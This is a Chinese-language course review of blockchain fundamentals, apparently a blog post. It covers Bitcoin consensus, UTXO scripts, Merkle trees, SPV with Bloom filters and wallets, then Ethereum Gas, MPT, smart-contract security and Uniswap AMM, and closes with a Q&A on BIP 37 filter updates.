<p>区块链技术提供了一种交易记录和执行的新的形式，具有去中心化、不可篡改和抵赖等优秀的性质，在金融和公共事务方面有着巨大的潜力应用。目前为止，区块链最成功的应用仍然是比特币，因此，课程中，我们主要以比特币为例子来讲解区块链。主要介绍了区块链中最基本和最重要的概念：分布式记账、共识机制、区块（Merkle树）、脚本等。在延伸介绍区块链2.0以太坊时，涉及了以太坊的特点、以太坊上智能合约的编写，以及区块链安全，特别是智能合约的安全。最后，介绍了以太坊上去中心化代币兑换协议uniswap。【最后，提及区块链3.0，讨论了PoW、PoS和DPoS的特点和区别。2020年没讲】</p>
<p>首先，我们讨论了数字货币的概念，通过回顾人类史上货币的发展历程，讨论货币的特点，它可以不具有实体、本质特征是账本上记录的交易。为了让金融系统公开、公正、不可篡改，需要一个分布式的具有不可篡改的记账系统。</p>
<p>在这样的分布式记账系统的发展过程中，出现了很多优秀的思想，例如CyberPunk曾先后提出的ecash、hashcash和B-money，比特币也是在这些尝试的基础上发展而来。ecash提出了盲签的概念，“这是第一次有人认为数字本身是有价值的，这个想法是你可以通过盲签名方法来获得这些数字，且没人知道你得到的是哪个数字，但他们知道这些是有价值的数字，银行会兑现他们的款项。”HashCash中提出了工作量证明的方法，“使用部分哈希的想法是它们可以被任意地设置为昂贵的计算成本，但是可以对其立即进行验证”。B-money中提出了公共账簿和使用公钥作为身份标识的方法，交易通过网络向所有节点进行广播。</p>
<p>分布式的、不可篡改、而且防止双重支付的公共账本的思想需要有强有力的技术支撑。区块链中依赖于密码学的技术，哈希和非对称加密。</p>
<p>比特币区块链中使用的哈希算法是SHA-256，它有一些很好的特性，如确定性、快速计算、隐藏性、雪崩效应以及抗冲突。哈希在区块链中的应用是工作量证明，在区块链中的节点为了争取到记账的权利，需要进行大量的哈希运算，找到满足条件的随机数，才能形成链上的区块。</p>
<p>比特币区块链中使用的非对称加密的算法是椭圆曲线。当前应用较广的非对称加密算法是RSA。课上我们详细介绍了RSA中公私密钥对生成的方法，以及使用RSA进行身份认证以及加密传输的过程。</p>
<p>接下来我们讨论了比特币中的共识机制PoW。共识机制本质上就是要保证所有节点认可的账本是唯一的。做到这一点，在中心化的系统中很容易，但是在分布式系统中，必须要考虑到参与节点的故障可能以及潜在的恶意攻击者的情况。在区块链上，所有的交易向所有的节点广播，矿工收到的交易的内容和顺序都可能不同；而且出块有奖励的情况下，所有的节点都会尽量出块。那么由哪个节点产生区块以及如何防止恶意节点攻击（如拒绝服务、双重支付等）？PoW通过让参与节点进行算力的竞争，使得在大部分的节点是诚实节点的情况下，DoS攻击以及双重支付攻击不会成功（支付等待6次确认）；即使有节点真正掌握了51%的算力，考虑到控制算力的巨大投入，节点也会主动维持区块链的正常运行。</p>
<p>在产生区块之后，接下来就是要理解区块上记录的内容。区块上的内容主要是一笔笔的交易。由于缺少对全局数据（如余额）的支持，比特币并没有采用基于账户的方式来表示交易，而是以UTXO（Unspent Transaction Output），将之前交易的输出作为新交易的输入。我们详细地察看了交易的具体内容，并介绍了输出位置上的ScriptPubKey以及输入部分的ScriptSig。先前交易的输出需要设置相应的条件，之后的交易必须要满足这个条件才能使用这笔输出中包含的钱。所以如果矿工在接收到交易时，将新交易中的ScriptSig和先前交易中的ScriptPubKey结合起来，能顺利运行结束返回True，那么这个交易便是合法的，可以被打包进区块。同时，因为所有的验证必须由矿工完成，为了防止矿工陷入死循环，比特币能支持的脚本语言是图灵不完备的，仅能够完成有限的操作。举一个简单的例子，如果之前交易中ScriptPubKey中设置的条件是 3 op_add 5 op_equal，那么新交易中的ScriptKey应该是什么呢？</p>
<p>考虑到比特币使用的是基于栈的操作。op_add是一个操作指令，需要有两个操作数，所以scriptSig中一定需要一个数字作为操作数。而后面的指令也很简单，需要和5进行比较操作。所以ScriptSig中需要输入2。</p>
<p>实际中常用的交易类型是P2PKH。使用P2PKH所需要的脚本是这样的。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233133.jpg" alt="img"></p>
<p>除了P2PKH之外，还有其他形式的交易，如P2PK，multiSig、P2SH等。另外介绍了一个例子Time_Lock。</p>
<p>在介绍完交易之后，我们讨论了区块的头部。在区块的头部有一个数据结构，Merkle root。在比特币网络中，Merkle树被用来归纳一个区块中的所有交易，同时生成整个交易集合的数字指纹，且提供了一种校验区块是否存在某交易的高效途径。生成一棵完整的Merkle树需要递归地对哈希节点对进行哈希，并将新生成的哈希节点插入到Merkle树中，直到只剩一个哈希节点，该节点就是Merkle树的根。这里我们需要了解Merkle证明和Merkle路径是怎么回事。</p>
<p>在之后我们介绍了SPV和Bloom过滤器。这里要理解Bloom过滤器的工作特点，为什么Bloom过滤器会造成false positive而不会造成false negative？</p>
<p>接下来，结合310比特币挑战，我们重点讨论了比特币钱包，用户应该如何管理比特币。这里我们主要讨论了助记词。助记词是如何生成的呢？</p>
<p>为了生成大量的密钥对，引入了HD钱包的概念。应该理解HD钱包是如何生成大量的密钥的。</p>
<p>以上是比特币的内容。接下来，我们开始介绍以太坊。以太坊提供了远比比特币广的应用场景，主要是因为它大大提高了区块的生成速度，以及提供了图灵完备的脚本语言。为了支持这些特性，相比于比特币，它引入一些新的概念，如Gas。请问Gas的目的是什么？</p>
<p>另外，为了支持基于账户的交易的支持，以太坊维护了状态树，因为状态树需要经常更新，所以以太坊使用了MPT。要求能够根据给出的键值对，画出相应的MPT。</p>
<p>接下来重点考虑了区块链的安全问题。区块链本身可能受到攻击，以太坊上的智能合约也有可能受到攻击。【在介绍智能合约的安全问题时，我们讨论了THE DAO 和 Fomo3d的攻击。要能够理解攻击产生的原因。】</p>
<p>Uniswap是DeFi中最著名的协议之一，在其中锁定和流动着巨额的资金。重点介绍了AMM的概念、计算；包括恒定乘积、滑点、无常损失等。</p>
<hr>
<p>答疑课上的共性问题，SPV使用bloom filter进行查询的时候，会什么需要更新bloom filter？</p>
<p>BIP 37在实现时，提供了Bloom_update_none选项，也即不更新。主要是因为，随着加入项的增多，Bloom Filter的效率会变低，用户可能需要定时刷新filter。同时，提供了Bloom_update_all选项，也即上文提到的将输出中的scriptpbk中的outpoint都加入进来；另外，还提供了Bloom_update_P2PUBKEY_ONLY选项，也即仅在输出脚本是 pay-to-pubkey或者是pay to multisig形式的时候才将outpoint添加到filter中。</p>
<p>我们来分析一下这样做的道理。为啥要加入outpoint，这里我们可以理解outpoint是包括了(txid，outputid)的一个数据结构。</p>
<p>如果用户要查询他的收入的，也即需要查询所有的scriptpbk中与他相关的交易。那么来分析一下我们介绍的P2PKH、P2PK、P2multisig以及P2SH这四种交易中，分别需要提供什么信息。</p>
<p>对于P2PKH，只需要提供公钥的哈希就能查询到；对于P2PK和P2multisig，只需要提供公钥就能查询到；对于P2SH，提供脚本的哈希就能查询到。这些信息都是可以提前确认的，所以并不需要更新filter。</p>
<p>但是当用户要查询他的支出，此时也即要查询所有的scriptsig。这时候我们需要向filter中提供什么信息呢？</p>
<p>对于收款交易是P2PKH的情况，只需要提供公钥就能查询到；对于收款交易是P2SH的情况，提供就能查询到；这些信息都是可以提前确认的，所以并不需要更新filter。但是对于P2PK和P2multisig呢？为了从这两种交易中赎出钱，需要提供的是签名，但是签名并不能提前确认；在这个scriptsig中能够确认的就是它是从哪里赎出的钱，也即outpoint，所以，需要向filter中添加这些信息。</p>
]]></content>
      <categories>
        <category>区块链</category>
      </categories>
      <tags>
        <tag>区块链</tag>
        <tag>比特币</tag>
        <tag>以太坊</tag>
      </tags>
  </entry>
</search>
